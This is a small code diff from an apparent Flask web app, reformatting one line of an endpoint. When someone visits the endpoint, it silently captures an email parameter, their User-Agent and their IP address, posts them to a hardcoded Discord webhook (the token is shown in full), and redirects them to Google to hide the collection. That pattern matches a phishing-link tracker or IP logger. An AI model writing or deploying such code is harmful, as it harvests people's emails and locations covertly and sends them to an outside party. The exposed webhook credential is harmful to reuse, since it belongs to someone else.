@@ -19,7 +19,7 @@ def idk_wtf():
     useragent = request.headers.get('User-Agent')
     src_ip = request.remote_addr
     discord = Discord(url="https://discord.com/api/webhooks/1217552500605849671/yzRXq3s_o4d424amxpcuqUgvNbQAkFiH-nYqfcFF--jxovQ1hdNtXv6j7BgtUbG7PwOf")
-    discord.post(content=f'Mail: {param}\n User-Agent: {useragent}\n IP: {src_ip}')
+    discord.post(content=f'Mail: {param}\nUser-Agent: {useragent}\nIP: {src_ip}')
     return redirect('https://google.com')
 
 # Run the Flask application
